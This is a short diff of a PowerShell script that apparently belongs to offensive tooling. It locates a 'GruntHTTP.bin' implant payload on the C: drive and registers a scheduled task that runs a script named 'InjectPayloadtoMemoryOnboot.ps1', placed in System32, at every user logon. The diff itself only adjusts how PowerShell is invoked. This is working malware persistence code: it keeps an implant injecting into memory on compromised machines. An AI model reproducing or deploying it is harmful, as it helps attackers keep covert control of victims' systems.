@@ -15,4 +15,4 @@ $filename = Get-ChildItem -path C:\ -Filter GruntHTTP.bin -Recurse | %{$_.FullNa
 
 
 # Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
-schtasks /create /tn "MyCustomTask" /sc onlogon /tr "powershell.exe C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
+schtasks /create /tn "MyCustomTask" /sc onlogon /tr "powershell.exe -File C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
